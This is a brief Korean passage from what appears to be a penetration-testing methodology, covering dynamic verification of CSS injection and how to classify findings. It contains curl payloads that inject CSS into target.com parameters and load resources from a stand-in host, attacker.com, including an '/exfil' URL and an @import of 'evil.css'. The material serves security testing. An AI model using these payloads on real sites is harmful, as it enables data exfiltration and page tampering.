### Phase 2: 동적 테스트 (검증)


**인라인 스타일 삽입 테스트:**
```
# 세미콜론으로 새 속성 추가
curl "https://target.com/profile?color=red%3B%20background-image%3A%20url(https%3A%2F%2Fattacker.com%2Fexfil)"

# 중괄호로 셀렉터 탈출
curl "https://target.com/profile?color=red%7D%20*%20%7B%20display%3Anone%20%7D%20.x%7B"
```

**`<style>` 태그 내 삽입 테스트:**
```
# @import로 외부 CSS 로드
curl "https://target.com/theme?color=red%7D%20%40import%20url(https%3A%2F%2Fattacker.com%2Fevil.css)%3B%20.x%7B"
```

**검증 방법:**
- 브라우저에서 페이지를 열어 삽입한 CSS가 적용되는지 확인 (배경색 변경, 요소 숨김 등)
- curl 응답에서 삽입한 CSS 구문이 이스케이프 없이 반영되는지 확인

**검증 기준:**
- **확인됨**: 동적 테스트로 CSS 구문이 삽입되어 스타일이 변경되거나 외부 리소스가 로드된 것을 직접 확인함
- **후보**: 동적 테스트를 수행하지 않았거나, 동적 테스트로 확인이 불가하여 수동 확인이 필요한 경우 (브라우저 렌더링 필요 등)
